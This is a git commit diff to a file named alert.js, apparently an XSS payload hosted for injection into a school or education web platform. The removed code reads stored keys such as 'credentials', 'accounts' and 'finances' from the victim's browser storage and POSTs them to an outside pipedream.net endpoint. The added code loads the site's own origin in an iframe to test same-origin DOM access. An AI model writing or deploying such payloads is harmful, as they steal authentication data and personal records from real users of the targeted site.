a24123779a0b98d1d0c81be48cd9199fd7694596
Exon2007 <lelongtristan474@gmail.com>
2026-01-03 12:31:53 +0100

    Update alert.js

--- alert.js
+++ alert.js
@@ -1,39 +1,22 @@
-alert("XSS");
+(() => {
+  const iframe = document.createElement("iframe");
+  iframe.src = location.origin;
+  iframe.style.width = "300px";
+  iframe.style.height = "150px";
+  document.body.appendChild(iframe);
 
-(async function () {
-  const keys = [
-    'accounts', 'badges', 'credentials', 'edhydration_auth',
-    'etablissement', 'finances',
-    'bigAds', 'fa', 'pdfjs.history'
-  ];
-
-  const url = 'https://eo2xdbuykftr5ce.m.pipedream.net';
-
-  const data = {
-    t: new Date().toISOString(),
-    u: navigator.userAgent,
-    l: location.href,
-    s: {}
+  iframe.onload = () => {
+    console.log("iframe loaded");
+    try {
+      const doc = iframe.contentDocument;
+      console.log("contentDocument accessible:", !!doc);
+      console.log("iframe origin:", iframe.contentWindow.location.origin);
+      console.log("parent origin:", location.origin);
+      console.log("same origin:", iframe.contentWindow.location.origin === location.origin);
+      console.log("iframe body:", doc.body);
+      console.log("iframe body innerHTML length:", doc.body.innerHTML.length);
+    } catch (e) {
+      console.log("DOM access blocked:", e.toString());
+    }
   };
-
-  keys.forEach(key => {
-    let value = sessionStorage.getItem(key);
-    if (value === null) {
-      value = localStorage.getItem(key);
-    }
-
-    if (value !== null) {
-      try {
-        data.s[key] = JSON.parse(value);
-      } catch {
-        data.s[key] = value;
-      }
-    }
-  });
-
-  await fetch(url, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(data)
-  });
 })();
